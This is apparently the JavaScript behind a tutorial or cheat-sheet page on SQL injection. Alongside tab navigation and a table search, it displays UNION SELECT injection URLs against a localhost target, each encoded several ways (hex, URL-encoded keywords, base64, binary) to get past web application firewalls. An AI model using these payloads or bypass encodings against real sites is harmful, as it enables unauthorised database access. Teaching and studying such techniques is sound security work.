function openNav(evt, navName) {
  var i, tabcontent, navlinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }
  navlinks = document.getElementsByClassName("nav-links");
  for (i = 0; i < navlinks.length; i++) {
    navlinks[i].className = navlinks[i].className.replace(" active", "");
  }
  document.getElementById(navName).style.display = "block";
  evt.currentTarget.className += " active";
}

// Get the element with id="defaultOpen" and click on it
document.getElementById("defaultOpen").click();

//
function base64spacer(){
  document.getElementById("bss64Url").innerHTML="https://site.com/index.php?id=[BASE64]=12]";
}
function HEXEncode(){
  document.getElementById("HEXUrl").innerHTML="localhost/index.php?id=12' Union Select 1,2,3,concat(0x696e6a65637465642062792070682e68697461636869),5,6,7,8,9,10-- -";
}
function HEXDecode(){
  document.getElementById("HEXUrl").innerHTML="localhost/index.php?id=12' Union Select 1,2,3,concat(injected by ph.hitachi),5,6,7,8,9,10-- -";
}
function URLEncode(){
  document.getElementById("%URLsite").innerHTML="localhost/index.php?id=12' %55nion %53elect 1,2,3,4,5,6,7,8,9,10-- -";
}
function URLDecode(){
  document.getElementById("%URLsite").innerHTML="localhost/index.php?id=12' Union Select 1,2,3,4,5,6,7,8,9,10-- -";
}
function BASE64Encode(){
  document.getElementById("BS64URL").innerHTML="http://localhost/index.php?id=MTInIFVuaW9uIFNlbGVjdCAxLDIsMyxjb25jYXQoJ2luamVjdGVkIGJ5IHBoLmhpdGFjaGknKSw1LDYsNyw4LDksMTAtLSAt";
}
function BASE64Decode(){
  document.getElementById("BS64URL").innerHTML="http://localhost/index.php?id=12' Union Select 1,2,3,concat('injected by ph.hitachi'),5,6,7,8,9,10-- -";
}

function BINARYEncode(){
  document.getElementById("BINARYURL").innerHTML="http://localhost/index.php?id=12' Union Select 1,2,3,concat(0b01110000011010000010111001101000011010010111010001100001011000110110100001101001),5,6,7,8,9,10-- -";
}
function BINARYDecode(){
  document.getElementById("BINARYURL").innerHTML="http://localhost/index.php?id=12' Union Select 1,2,3,concat(ph.hitachi),5,6,7,8,9,10-- -";
}
//search in table waf
function searchWaf() {
  var input, filter, table, tr, td, i, txtValue;
  input = document.getElementById("searchWaf");
  filter = input.value.toUpperCase();
  table = document.getElementById("TableWaf");
  tr = table.getElementsByTagName("tr");
  for (i = 0; i < tr.length; i++) {
    td = tr[i].getElementsByTagName("td")[0];
    if (td) {
      txtValue = td.textContent || td.innerText;
      if (txtValue.toUpperCase().indexOf(filter) > -1) {
        tr[i].style.display = "";
      } else {
        tr[i].style.display = "none";
      }
    }       
  }
}
